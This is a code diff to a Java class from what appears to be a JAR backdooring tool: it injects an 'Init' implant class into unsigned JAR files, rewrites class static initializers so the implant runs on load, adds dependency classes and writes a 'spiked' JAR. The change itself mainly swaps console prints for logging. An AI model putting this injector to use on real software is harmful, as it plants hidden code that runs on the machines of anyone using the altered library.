@@ -8,11 +8,13 @@ import java.nio.ByteOrder;
 import java.nio.file.Path;
 import java.util.Map;
 import java.util.jar.JarEntry;
+import java.util.logging.Logger;
 import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
 public class ClassInjector {
+    private final static Logger log = Logger.getLogger("ClassInjector");
     final static String IMPLANT_CLASS_NAME = "Init";
     private final ImplantHandler implantHandler;
 
@@ -24,18 +26,19 @@ public class ClassInjector {
         ClassFile implantedClass = null;
 
         if (jarLooksSigned(targetJarFilePath)) {
-            System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
+            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
             return false;
         }
 
         BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
         try {
+            int countClinitModified = 0;
             for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
                     continue;
                 }
                 if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
-                    System.out.println("[-] Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
+                    log.fine("Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
                     continue;
                 }
 
@@ -52,9 +55,9 @@ public class ClassInjector {
                     JarEntry newJarEntry = convertToJarEntry(implant);
                     try {
                         fiddler.addNewEntry(newJarEntry, asByteArray(implant));
-                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                        log.info("Created implant class '" + newJarEntry.getName() + "'.");
                     } catch (ZipException e) {
-                        System.out.println("[-] Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
+                        log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
                         continue;   // TODO Signal these different endgames using exceptions instead
                     }
 
@@ -71,13 +74,16 @@ public class ClassInjector {
                  */
                 modifyClinit(currentlyProcessing, implantedClass);
                 entry.replaceContentWith(asByteArray(currentlyProcessing));
-                System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
+                countClinitModified++;
+                log.fine("Modified class initializer for '" + entry.getName() + "'.");
             }
+            log.info("Modified the class initializer for  " + countClinitModified + " classes.");
 
             boolean didInfect = implantedClass != null;
 
             // Add any dependency classes needed for the implant
             if (didInfect) {
+                int countDependencies = 0;
                 for (Map.Entry<String, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
                     String fileName = convertToJarEntryPathName(dependencyEntry.getKey());
                     byte[] fileContent = dependencyEntry.getValue();
@@ -85,20 +91,23 @@ public class ClassInjector {
                     JarEntry newJarEntry = new JarEntry(fileName);
                     try {
                         fiddler.addNewEntry(newJarEntry, fileContent);
-                        System.out.println("[+] Added dependency file '" + fileName + "'.");
+                        countDependencies++;
+                        log.fine("Added dependency file '" + fileName + "'.");
                     } catch (ZipException e) {
-                        System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                        // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
+                        log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
                         didInfect = false;
                         break;
                     }
                 }
+                log.info("Added " + countDependencies + " dependencies.");
             }
 
             if (didInfect) {
                 fiddler.write(outputJar);
-                System.out.println("[+] Wrote spiked JAR to " + outputJar);
+                log.info("Wrote output JAR to '" + outputJar + "'.");
             } else {
-                System.out.println("[-] Did not write to any JAR.");
+                log.warning("No output JAR was written.");
             }
 
             return didInfect;
